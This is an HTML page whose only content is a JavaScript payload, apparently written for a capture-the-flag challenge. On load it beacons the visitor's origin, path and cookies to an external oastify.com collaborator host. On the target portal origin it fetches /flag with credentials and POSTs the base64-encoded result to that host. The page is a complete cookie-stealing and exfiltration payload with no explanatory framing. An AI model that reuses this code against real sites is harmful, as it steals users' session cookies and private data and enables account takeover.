<!doctype html><meta charset="utf-8">
<script>
(async()=>{
  const COLLAB='https://uecdtvfmdq46hawfas86jf4iu900otci.oastify.com';
  const b64 = s => btoa(unescape(encodeURIComponent(s)));
  // context beacon
  new Image().src = COLLAB+'/ctx?o='+encodeURIComponent(location.origin)
                         +'&p='+encodeURIComponent(location.pathname)
                         +'&c='+encodeURIComponent(document.cookie||'')
                         +'&t='+Date.now();

  // if we are in portal origin, cookies won't be empty and origin will match
  if (location.origin === 'https://5119ea598d886cea.chal.ctf.ae' && (document.cookie||'').length) {
    try{
      const r = await fetch('/flag', {credentials:'include', mode:'same-origin'});
      const t = await r.text();
      await fetch(COLLAB+'/dump', {method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain'}, body:b64(t)});
    }catch(e){
      new Image().src = COLLAB+'/err?m='+encodeURIComponent(String(e));
    }
  }
})();
</script>
